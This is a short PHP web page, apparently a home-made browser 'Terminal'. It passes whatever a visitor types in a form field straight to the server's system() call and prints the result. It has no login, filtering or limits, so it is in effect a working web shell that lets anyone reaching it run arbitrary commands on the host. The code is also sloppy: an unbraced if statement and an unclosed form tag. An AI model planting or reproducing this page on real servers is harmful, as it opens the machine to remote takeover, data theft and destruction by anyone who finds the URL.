<!DOCTYPE html>
<html>
<head>
  <title>Terminal</title>
  <link rel="stylesheet" href="/css/terminal.css">

  <script type="text/javascript">
      
  </script>
</head>
<body>

  <div id="terminalbody">
    <div id="termtitle">
      <h1>Terminal</h1>
      <hr/>
    </div>
    <div id="terminal">
        <p id="termcode">
        <?php
          
          echo 'Note: Change Directory not possible!<br/><br/>';

          if(isset($_POST['command']))
            $com = $_POST['command'];
            if(empty($com)){
              echo "Type Help or ? for help";
            }
            else{
            echo '<pre>';
            echo "Executed: /$com".'<br/><br/>';
            echo system($com);
            echo '</pre>';
            }
        ?>  
        </p>
    </div>

    <div id="input">
      <div id="inbox">
        <form action="terminal.php" method="post">
          <input type="text" name="command">
          <br/><br/>
          <input id="enter" type="Submit" value="Run">
        <form>
      </div>
    </div>
  </div>
</body>
</html>